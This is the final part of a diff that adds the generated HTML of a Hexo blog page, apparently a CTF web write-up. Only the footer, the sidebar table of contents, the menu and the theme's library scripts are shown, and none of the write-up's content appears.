+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#guessgetrandbits%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%A2%84%E6%B5%8B"><span class="toc-number">1.</span> <span class="toc-text"> guess(getrandbits伪随机数预测)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.1.</span> <span class="toc-text"> 前置知识点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3"><span class="toc-number">1.2.</span> <span class="toc-text"> 题解</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pdf2textpdfpickle%E6%B2%A1%E6%87%82"><span class="toc-number">2.</span> <span class="toc-text"> pdf2text(PDF+pickle&#x3D;没懂)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%BE%E9%93%BE%E5%AD%90"><span class="toc-number">2.1.</span> <span class="toc-text"> 找链子</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3-2"><span class="toc-number">2.2.</span> <span class="toc-text"> 题解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">2.3.</span> <span class="toc-text"> 参考</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "FuB0Y",
+          title: "WMCTF2025web部分题解",
+          url: "http://example.com/2025/09/22/WMCTF2025web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/",
+          excerpt: "",
+          description: "",
+          stripContent: "[TOC]  guess(getrandbits伪随机数预测)  前置知识点 [CTF/randcrack]python随机数预测模块分析及改进方案_random.getrandbits(32)-CSDN博客  题解 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475",
+          date: "Mon Sep 22 2025 21:39:44 GMT+0800",
+          updated: "Wed Dec 10 2025 16:14:38 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+  
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.js" integrity="sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm&#x2F;Yr2r3Dy4lfFg" crossorigin="anonymous" defer data-pjax></script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/contrib/auto-render.min.js" integrity="sha384-43gviWU0YVjaDtb&#x2F;GhzOouOXtZMP&#x2F;7XUzwPTstBeZFe&#x2F;+rCMvRwr4yROQP43s0Xk" crossorigin="anonymous" defer onload="renderMathInElement(document.body, {delimiters: [{left: &#39;$$&#39;, right: &#39;$$&#39;, display: true},{left: &#39;$&#39;, right: &#39;$&#39;, display: false}]});" data-pjax></script>
+
+  
+
+
+
+
+
+  </body>
+  </html>
+
